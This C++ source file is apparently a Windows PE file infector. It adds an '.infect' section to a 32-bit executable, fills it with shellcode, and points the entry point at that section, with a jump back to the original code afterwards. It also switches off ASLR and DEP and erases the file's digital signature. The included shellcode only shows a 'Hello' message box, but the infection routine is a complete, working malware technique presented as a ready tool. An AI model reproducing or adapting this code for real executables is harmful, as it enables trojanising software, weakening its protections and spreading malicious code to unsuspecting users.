#include <iostream>
#include <windows.h>
#include <fstream>
#include <future>
#include <string>
#include <memory.h>
#include <stdio.h>
#include <vector>
#include "PE.h"
#include <bitset>
using namespace std;

constexpr std::size_t align_up(std::size_t value, std::size_t alignment) noexcept {
    return (value + alignment - 1) & ~(alignment - 1);
}

bool InfectPE(char* PE_file, size_t PE_fileSize, char* shellcode, size_t shellcodeSize, char* output_file) {
    auto Parsed_PE = PE::ParsePE(PE_file);

    if (Parsed_PE.inh32.OptionalHeader.ImageBase < 0x400000 && Parsed_PE.inh32.OptionalHeader.ImageBase > 0x1000000) {
        cout << "Not a valid ImageBase" << endl;
        return false;
    }

    // Prep shellcode to jmp to the original entry point
    auto imageBase = Parsed_PE.inh32.OptionalHeader.ImageBase;
    auto addressOfEntryPoint = Parsed_PE.inh32.OptionalHeader.AddressOfEntryPoint;
    auto absAddressOfEntryPoint = imageBase + addressOfEntryPoint;

    char push[] = { 0x68 };           // push
    char jmp[] = { (char) 0xff, (char) 0x24, (char) 0x24 };    // jmp [esp]
    char hex_absAddressOfEntryPoint[] = { (char) ((absAddressOfEntryPoint >> 0) & 0xff), (char) ((absAddressOfEntryPoint >> 8) & 0xff), (char) ((absAddressOfEntryPoint >> 16) & 0xff), (char) ((absAddressOfEntryPoint >> 24) & 0xff) }; // address of entry point in little endian
    auto newShellcodeSize = shellcodeSize + sizeof(push) + sizeof(hex_absAddressOfEntryPoint) + sizeof(jmp);

    // Increase the number of sections (inside PE::parsePE we already allocate memory for the new section)
    Parsed_PE.inh32.FileHeader.NumberOfSections += 1;
    int indexInfectHdr = Parsed_PE.inh32.FileHeader.NumberOfSections - 1;
    int indexPrevHdr = indexInfectHdr - 1;

    // Create a fresh section header
    Parsed_PE.ish[indexInfectHdr] = IMAGE_SECTION_HEADER{};

    IMAGE_SECTION_HEADER* pInfectHdr = &Parsed_PE.ish[indexInfectHdr];
    IMAGE_SECTION_HEADER* pPrevHdr = &Parsed_PE.ish[indexPrevHdr];

    auto alignedNewSellcodeSize = align_up(newShellcodeSize, Parsed_PE.inh32.OptionalHeader.SectionAlignment);

    // Fill the section header
    memcpy(pInfectHdr->Name, ".infect", 8);
    pInfectHdr->VirtualAddress = align_up(pPrevHdr->VirtualAddress + pPrevHdr->Misc.VirtualSize, Parsed_PE.inh32.OptionalHeader.SectionAlignment);
    pInfectHdr->PointerToRawData = align_up(pPrevHdr->PointerToRawData + pPrevHdr->SizeOfRawData, Parsed_PE.inh32.OptionalHeader.FileAlignment);
    pInfectHdr->Misc.VirtualSize = newShellcodeSize;
    pInfectHdr->SizeOfRawData = alignedNewSellcodeSize;
    pInfectHdr->Characteristics = IMAGE_SCN_CNT_CODE | IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE;

    // Update the NT header
    Parsed_PE.inh32.OptionalHeader.AddressOfEntryPoint = pInfectHdr->VirtualAddress;
    Parsed_PE.inh32.OptionalHeader.SizeOfImage = align_up(pInfectHdr->VirtualAddress + pInfectHdr->Misc.VirtualSize, Parsed_PE.inh32.OptionalHeader.SectionAlignment);
    
    // Copy shellcode to the new section
    shared_ptr<char> n_section(new char[alignedNewSellcodeSize]{}, std::default_delete<char[]>());
    Parsed_PE.Sections.push_back(n_section);

    auto injSection = n_section.get();
    memcpy(&injSection[0], shellcode, shellcodeSize - 1);
    cout << shellcodeSize << endl;
    memcpy(&injSection[shellcodeSize - 1], push, sizeof(push));
    memcpy(&injSection[shellcodeSize - 1 + sizeof(push)], hex_absAddressOfEntryPoint, sizeof(hex_absAddressOfEntryPoint));
    memcpy(&injSection[shellcodeSize - 1 + sizeof(push) + sizeof(hex_absAddressOfEntryPoint)], jmp, sizeof(jmp));

    // Disable ASLR
    Parsed_PE.inh32.OptionalHeader.DllCharacteristics &= ~IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE;
    Parsed_PE.inh32.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress = 0;
    Parsed_PE.inh32.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size = 0;
    Parsed_PE.inh32.FileHeader.Characteristics &= ~IMAGE_FILE_RELOCS_STRIPPED;

    // Disable DEP
    Parsed_PE.inh32.OptionalHeader.DllCharacteristics &= ~IMAGE_DLLCHARACTERISTICS_NX_COMPAT;

    // Erase digital signature
    Parsed_PE.inh32.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY].VirtualAddress = 0;
    Parsed_PE.inh32.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY].Size = 0;

    // Update sizes
    Parsed_PE.size_sections += alignedNewSellcodeSize;

    // Dump the infected PE
    PE::WriteBinary(Parsed_PE, output_file, PE_fileSize + alignedNewSellcodeSize);

    return true;
}

int main(int argc, char *argv[]) {

    if (argc < 3) {
        cout << "Usage: " << argv[0] << " <path_exe> <patched_path_exe>" << endl;
        return EXIT_FAILURE;
    }

    std::fstream::openmode mode = std::fstream::in;
    fstream inFile;
    inFile.open(argv[1], mode);
    if (!inFile.is_open()) {
        cout << "Input file does not exist" << endl;
        return EXIT_FAILURE;
    }

    std::remove(argv[2]);

    tuple<bool, char*, streampos> bin = PE::OpenBinary(argv[1]);

    if(!get<0>(bin)) {
        cout << "Error opening file" << endl;
        return EXIT_FAILURE;
    }

    char shellcode[] = "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x2f\x59\x88\x51\x0a\xbb\x70\x12\xf8\x76\x51\xff\xd3\xeb\x31\x59\x31\xd2\x88\x51\x0b\x51\x50\xbb\x80\xfb\xf7\x76\xff\xd3\xeb\x31\x59\x31\xd2\x88\x51\x05\x31\xd2\x52\x51\x51\x52\xff\xd0\xeb\x2c\xe8\xcc\xff\xff\xff\x75\x73\x65\x72\x33\x32\x2e\x64\x6c\x6c\x4e\xe8\xca\xff\xff\xff\x4d\x65\x73\x73\x61\x67\x65\x42\x6f\x78\x41\x4e\xe8\xca\xff\xff\xff\x48\x65\x6c\x6c\x6f\x4e\x31\xd2\x50";
    
    if (!InfectPE(get<1>(bin), get<2>(bin), shellcode, sizeof(shellcode), argv[2])) {
        cout << "Error infecting file" << endl;
        return EXIT_FAILURE;
    }

    return EXIT_SUCCESS;
}